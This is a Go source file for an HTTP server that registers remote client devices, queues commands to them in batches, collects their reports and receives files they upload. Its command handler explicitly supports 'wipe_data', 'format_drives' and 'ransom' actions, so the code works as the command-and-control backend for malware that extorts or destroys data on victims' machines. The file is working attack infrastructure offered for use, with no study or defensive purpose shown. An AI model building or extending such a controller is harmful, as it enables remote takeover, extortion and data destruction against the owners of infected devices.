package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// Device represents a connected client
type Device struct {
	ID        string       `json:"id"`
	Hostname  string       `json:"hostname"`
	OS        string       `json:"os"`
	IP        string       `json:"ip"`
	LastSeen  time.Time    `json:"last_seen"`
	Status    string       `json:"status"`
	Remark    string       `json:"remark"`
	GroupName string       `json:"group_name"`
	CommandQ  []Command    `json:"-"`
	Logs      []CommandLog `json:"-"`
}

// Command represents an action to be performed by the client
type Command struct {
	ID      string `json:"id"`
	Action  string `json:"action"`
	Payload string `json:"payload"`
}

var (
	// devices map is removed in favor of DB
	mu sync.RWMutex // Still useful for thread-safe operations if needed, but DB handles concurrency mostly
)

func main() {
	// Initialize Database
	initDB()

	// API Routes
	http.HandleFunc("/api/register", handleRegister)
	http.HandleFunc("/api/poll", handlePoll)
	http.HandleFunc("/api/report", handleReport)
	http.HandleFunc("/api/heartbeat", handleHeartbeat)

	// Admin Routes
	http.HandleFunc("/", handleDashboard)
	http.HandleFunc("/admin/command", handleSendCommand)
	http.HandleFunc("/admin/remark", handleUpdateRemark)
	http.HandleFunc("/admin/group", handleUpdateGroup)
	http.HandleFunc("/admin/batch_group", handleBatchUpdateGroup)
	http.HandleFunc("/admin/logs", handleGetLogs)
	http.HandleFunc("/admin/password", handleUpdatePassword)
	http.HandleFunc("/api/upload", handleUpload)

	// Serve static files (uploads)
	http.Handle("/uploads/", http.StripPrefix("/uploads/", http.FileServer(http.Dir("uploads"))))

	// Serve static files if needed (not used in this simple example)
	// http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// addr := ":443"
	// In a real deployment, you would provide paths to your certificate and key
	// err := http.ListenAndServeTLS(addr, "cert.pem", "key.pem", nil)

	// For demonstration purposes without certs, we'll run on HTTP :8080
	// PROD: Use the TLS version above
	fmt.Println("Server started on :8080 (Production should use :443 with TLS)")
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

// --- API Handlers ---

func handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var d Device
	if err := json.NewDecoder(r.Body).Decode(&d); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	d.IP = r.RemoteAddr
	d.LastSeen = time.Now()
	d.Status = "在线"

	if err := upsertDevice(&d); err != nil {
		log.Println("Error registering device:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
}

func handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		http.Error(w, "Missing ID", http.StatusBadRequest)
		return
	}

	// For heartbeat, we just want to update last_seen.
	// We can reuse upsert or create a specific updateLastSeen function.
	// Re-using upsert requires fetching first or just partial update.
	// Let's just use upsert but we need to know the other fields to not overwrite with empty?
	// Actually, upsertDevice in db.go updates specific fields.
	// Ideally we should have a `touchDevice(id)` function.
	// For now, let's fetch and update.
	d, err := getDevice(id)
	if err != nil {
		// If device not found, maybe re-register? Or ignore.
		return
	}
	d.LastSeen = time.Now()
	d.Status = "在线"
	upsertDevice(d)

	w.WriteHeader(http.StatusOK)
}

func handlePoll(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		http.Error(w, "Missing ID", http.StatusBadRequest)
		return
	}

	// Update presence
	d, err := getDevice(id)
	if err == nil {
		d.LastSeen = time.Now()
		d.Status = "在线"
		upsertDevice(d)
	}

	// Check for pending commands
	cmd, err := getNextCommand(id)
	if err != nil {
		log.Println("Error fetching command:", err)
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}

	if cmd != nil {
		json.NewEncoder(w).Encode(cmd)
		return
	}

	// No commands
	w.WriteHeader(http.StatusNoContent)
}

func handleReport(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var l CommandLog
	if err := json.NewDecoder(r.Body).Decode(&l); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Ensure ID and CreatedAt are set if not provided by client (though client usually sends result only)
	// Actually client sends ID of command, Action, Result. CreatedAt is server time.
	// But ID should be unique for the LOG entry, not the command ID?
	// If we use command ID as log ID, it's fine.
	// Let's rely on server to set CreatedAt

	if err := addCommandLog(l); err != nil {
		log.Println("Error adding log:", err)
		http.Error(w, "Database Error", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// --- Admin Handlers ---

func handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Support both JSON (AJAX) and Form data
	var deviceIDs []string
	var action, password, payload string

	if r.Header.Get("Content-Type") == "application/json" {
		var req struct {
			DeviceIDs []string `json:"device_ids"`
			Action    string   `json:"action"`
			Password  string   `json:"password"`
			Payload   string   `json:"payload"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		deviceIDs = req.DeviceIDs
		action = req.Action
		password = req.Password
		payload = req.Payload
	} else {
		// Fallback for old form (though we are moving to AJAX)
		deviceID := r.FormValue("device_id")
		if deviceID != "" {
			deviceIDs = []string{deviceID}
		}
		action = r.FormValue("action")
		password = r.FormValue("password")
		payload = r.FormValue("payload")
	}

	if len(deviceIDs) == 0 {
		if r.Header.Get("Content-Type") == "application/json" {
			json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "No devices selected"})
			return
		}
		http.Error(w, "No devices selected", http.StatusBadRequest)
		return
	}

	// Require password for sensitive commands
	if action == "wipe_data" || action == "format_drives" || action == "ransom" {
		if !checkPassword(password) {
			if r.Header.Get("Content-Type") == "application/json" {
				w.WriteHeader(http.StatusForbidden)
				json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "密码错误"})
				return
			}
			http.Error(w, "密码错误，无法执行敏感操作", http.StatusForbidden)
			return
		}
	}

	count := 0
	for _, id := range deviceIDs {
		cmd := Command{
			ID:      fmt.Sprintf("%d-%s", time.Now().UnixNano(), id), // Make ID unique per device/time
			Action:  action,
			Payload: payload,
		}

		if err := addCommand(id, cmd); err != nil {
			log.Println("Error adding command for device", id, ":", err)
		} else {
			count++
		}
	}

	if r.Header.Get("Content-Type") == "application/json" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "count": count})
		return
	}

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleUpdateGroup(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	deviceID := r.FormValue("device_id")
	groupName := r.FormValue("group_name")

	if err := updateDeviceGroup(deviceID, groupName); err != nil {
		log.Println("Error updating group:", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleBatchUpdateGroup(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		DeviceIDs []string `json:"device_ids"`
		GroupName string   `json:"group_name"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	for _, id := range req.DeviceIDs {
		if err := updateDeviceGroup(id, req.GroupName); err != nil {
			log.Println("Error updating group for device", id, ":", err)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "count": len(req.DeviceIDs)})
}

func handleUpdateRemark(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	deviceID := r.FormValue("device_id")
	remark := r.FormValue("remark")

	if err := updateDeviceRemark(deviceID, remark); err != nil {
		log.Println("Error updating remark:", err)
	}

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleUpdatePassword(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	newPassword := r.FormValue("new_password")
	if newPassword != "" {
		setPassword(newPassword)
	}

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleGetLogs(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("device_id")
	if id == "" {
		http.Error(w, "Missing device_id", http.StatusBadRequest)
		return
	}

	logs, err := getCommandLogs(id)
	if err != nil {
		log.Println("Error fetching logs:", err)
		http.Error(w, "Database Error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(logs)
}

//go:embed templates/dashboard.html
var dashboardHTML embed.FS

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	t, err := template.ParseFS(dashboardHTML, "templates/dashboard.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	deviceList, err := getAllDevices()
	if err != nil {
		http.Error(w, "Database Error", http.StatusInternalServerError)
		return
	}

	t.Execute(w, deviceList)
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	deviceID := r.FormValue("device_id")
	if deviceID == "" {
		http.Error(w, "Missing device_id", http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error retrieving file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Create uploads directory for device
	uploadDir := filepath.Join("uploads", deviceID)
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		http.Error(w, "Error creating directory", http.StatusInternalServerError)
		return
	}

	// Save file
	dstPath := filepath.Join(uploadDir, header.Filename)
	dst, err := os.Create(dstPath)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "File uploaded successfully")
}
